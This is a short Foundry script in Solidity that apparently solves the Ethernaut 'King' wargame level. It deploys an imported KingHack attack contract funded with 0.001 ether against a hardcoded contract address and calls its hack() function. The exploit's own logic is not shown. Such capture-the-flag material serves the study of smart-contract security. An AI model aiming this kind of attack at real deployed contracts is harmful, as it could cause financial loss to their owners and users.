// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {KingHack} from "ethernaut/king_hack.sol";
import "forge-std/console.sol";

contract KingHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        KingHack kingHack = new KingHack{value:0.001 ether}(0xd0d1A4C17Bb69599aD99a99D9519b6dE004803B7);
        kingHack.hack();
        vm.stopBroadcast();
    }
}
